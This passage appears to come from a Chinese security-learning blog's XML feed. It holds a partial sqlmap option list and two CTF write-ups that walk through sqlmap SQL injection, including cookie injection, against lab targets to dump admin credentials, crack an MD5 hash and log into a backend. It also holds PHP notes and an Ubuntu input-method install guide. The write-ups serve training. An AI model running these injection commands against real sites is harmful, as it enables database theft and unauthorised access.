远程临时文件目录的绝对路径 Windows注册表访问：这些选项可以被用来访问后端数据库管理系统Windows注册表。 –reg-read 读一个Windows注册表项值–reg-add 写一个Windows注册表项值数据–reg-del 删除Windows注册表键值–reg-key=REGKEY Windows注册表键–reg-value=REGVAL Windows注册表项值–reg-data=REGDATA Windows注册表键值数据–reg-type=REGTYPE Windows注册表项值类型这些选项可以用来设置一些一般的工作参数。-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中-s SESSIONFILE 保存和恢复检索会话文件的所有数据–flush-session 刷新当前目标的会话文件–fresh-queries 忽略在会话文件中存储的查询结果–eta 显示每个输出的预计到达时间–update 更新SqlMap–save file保存选项到INI配置文件–batch 从不询问用户输入，使用所有默认配置。 Miscellaneous（杂项）：–beep 发现SQL注入时提醒–check-payload IDS对注入payloads的检测测试–cleanup SqlMap具体的UDF和表清理DBMS–forms 对目标URL的解析和测试形式–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果–page-rank Google dork结果显示网页排名（PR）–parse-errors 从响应页面解析数据库管理系统的错误消息–replicate 复制转储的数据到一个sqlite3数据库–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址–wizard 给初级用户的简单向导界面 相关链接：http://bbs.ichunqiu.com/thread-10583-1-1.html]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap之cookie注入（靶场第二题）]]></title>
    <url>%2F2019%2F03%2F03%2Fsqlmap1%2F</url>
    <content type="text"><![CDATA[sqlmap靶场第二题：https://hack.zkaq.org/?a=battle&amp;f=target&amp;id=31ac789a52edf9bb首先我们尝试下sql注入 http://120.203.13.75:8001/shownews.asp?id=171%20and%201=1 说明该网站有防sql注入。那么我们使用cookie注入 http://120.203.13.75:8001/shownews.asp?id=171%20order%20by%2010 第一步猜解表 sqlmap -u &quot;http://120.203.13.75:8001/shownews.asp?&quot; --cookie &quot;id=171&quot; --table --level 2 第二步，猜字段 sqlmap -u &quot;http://120.203.13.75:8001/shownews.asp?&quot; --cookie &quot;id=171&quot; --column -T admin --level 2 第三步，爆数据 sqlmap -u &quot;http://120.203.13.75:8001/shownews.asp?&quot; --cookie &quot;id=171&quot; --dump -T admin -C &quot;username,password&quot; --level 2 b9a2a2b5dffb918c,该密码是md5加密，百度搜索md5在线加密我们已经拿到密码了进入后台网站,利用御剑工作扫出后台http://120.203.13.75:8001/admin输入账号admin,密码welcome获取flag]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap安装与使用（实验吧第3题）]]></title>
    <url>%2F2019%2F03%2F03%2Fsqlmap0%2F</url>
    <content type="text"><![CDATA[使用的环境是Ubuntu系统 sqlmap的安装sqlmap需要安装python2环境,python3不行(Ubuntu下默认安装python2)输入命令：sudo apt sqlamp检查是否安装成功输入命令：sqlmap -help返回下面结果即为成功。 sqlmap基本参数sqlmap -h 查看帮助选项is -dba 当前用户权限dbs 所有数据库current-db 网站当前数据库users 所有数据库用户current-user 当前数据库用户tables 参数：列表名columns 参数：字段名dump 参数：下载数据 sqlmap牛刀小试我们以这到题为例http://www.shiyanbar.com/ctf/33。如果没有注册过实验吧的朋友先注册下实验吧拿到题目我们判断下有没有sql注入 在url后面加上and 1=1,没有报错 加上and 1=2，报错。 说明有sql注入 第一步使用sqlmap查看数据库信息输入命令：sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; --current-db经过一些时间成功爆出当前数据库为my_db,如果注入过程提示选择y或者n，一般是选择y。大概就是尝试更多的方法进行注入第二步、爆出表名输入命令：sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; -D my_db --tables 第三步爆字段名输入命令： sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; -D my_db -T thiskey --columnsy 第四步、爆数据输入命令： sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; -D my_db -T thiskey -C k0y --dump 稍等片刻，成功找到flag：whatiMyD91dump]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP strcmp（）函数 引入文件语句的区别 魔术方法]]></title>
    <url>%2F2019%2F02%2F28%2FPHP1%2F</url>
    <content type="text"><![CDATA[一、strcmp（）函数1、strcmp（）的作用是比较2个字符串（区分大小写）2、基本语法： stcmp(string1,string2)//string1和2进行比较 3、技术细节：如果返回值为0,2个字符串相等如果返回值小于0,string1小于string2如果返回值大于0,string1大于string2注意的是，PHP版本得为4+ 该函数与stncmop()函数类似，不同的是，stncmop()函数可以指定字符串用于比较的字符数基本语法： strncmp(string1,string2,length) 二、include() 、require()语句包含并运行指定文件。这两结构在包含文件上完全一样，唯一的区别是对于错误的处理。require()语句在遇到包含文件不存在，或是出错的时候，就停止即行，并报错。include()则继续即行。 include(‘hello.php’); echo ‘include test final!’;//include报错，但是会继续执行，显示：include test final! require(‘hello.php’); echo ‘require test final!’;//require报错，停止代码的执行。 二、include, include_once, require, require_once 的区别include 和 include_once 只有在 php 执行到该语句时才会执行文件包含的操作。其中，include在包含文件出错时会提示 warning, 但后续的代码仍会继续执行, iclude_once 不会重复包含同一文件;require 和 require_once 在php文件执行前就把需要包含的文件的内容替换掉 require 语句本身, 所以在包含文件出错时会抛出error, 后续代码不会继续执行, require_once 也只执行一次包含操作.下面这篇博客是教详细介绍了他们·的区别https://blog.csdn.net/j393819650/article/details/53836525 三、魔术方法具体的大家可以看php手册之魔术方法这边就只是简单介绍下他们何时会触发 1、__construct,构造函数，具有构造函数的类会在每次创建新对象时先调用此方法（实例化对象时） 2、__destruct,解析函数，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。（类对象使用结束时自动调用） 3、属性重载在给不可访问（未定义）属性赋值时，__set() 会被调用。 读取不可访问（未定义）属性的值时，__get() 会被调用。 当对不可访问（未定义）属性调用 isset() 或 empty() 时，__isset() 会被调用。 当对不可访问（未定义）属性调用 unset() 时，__unset() 会被调用。注意的是：这些魔术方法的参数都不能通过引用传递 4、方法重载在对象中调用一个不可访问方法时，__call() 会被调用。 在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用 5、__sleep(),serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作 6、 __wakeup ，与之相反，unserialize() 会检查是否存在一个 wakeup() 方法。如果存在，则会先调用 wakeup 方法，预先准备对象需要的资源。__wakeup() 经常用在反序列化操作中。 7、__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误 注意！！！！不能在 __toString() 方法中抛出异常。这么做会导致致命错误。 8、__invoke()当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。注意：在PHP5.3.0版本上才有效 9、 __set_state()，自 PHP 5.1.0 起当调用 var_export() 导出类时，此静态 方法会被调用。 10、__clone(),当使用__clone()复制一个对象时候调用。 11、__debugInfo ( ) :，在转储对象以获取应该显示的属性时，var_dump()调用此方法。如果方法没有在对象上定义，那么将显示所有公共、受保护和私有属性。]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu系统安装搜狗输入法]]></title>
    <url>%2F2019%2F02%2F27%2Fpostname%2F</url>
    <content type="text"><![CDATA[ubuntu默认是字母，当然有中文输入法fcixtx(小企鹅输入法)，但是我不怎么喜欢用，接下来我们就来安装搜狗输入法下载命令全部在终端中执行 一、下载搜狗输入法的安装包​ 下载地址为：http://pinyin.sogou.com/linux/ 12下载命令wget &quot;http://cdn2.ime.sogou.com/dl/index/1524572264/sogoupinyin_2.2.0.0108_amd64.deb?st=tQdHKEaxh6PcyFVf4QfT1A&amp;e=1539855246&amp;fn=sogoupinyin_2.2.0.0108_amd64.deb&quot; 注意：要选择与自己系统相对应的安装包，我的系统是ubuntu64位，所以我下载64位的安装包 二、查看是否下载成功输入命令ls -l 三、安装搜狗输入法安装包1sudo dpkg -i sogoupinyin_2.2.0.0082_amd64.deb//-i后面为我们下载的安装包的文件名 四、选择fcitx输入法从系统设置里面点击“语言支持”，从语言支持里面选择小企鹅输入法（fcitx），默认为ibus，搜狗输入要安装在fcitx输入法上面。你可能会打不开“语言支持”，只需执行命令sudo apt-get install -f 即可修复错误，打开语音支持 如果没有小企鹅输入法的话执行以下命令 12sudo apt-get updatesudo apt-get upgrade 1、重启（可以使用命令reboot）然后在系统设置中选择 fcitx configure,然后按下图操作 六、安装中文语言操作如下图等他下载完成后最后重启，大功告成]]></content>
  </entry>
</search>
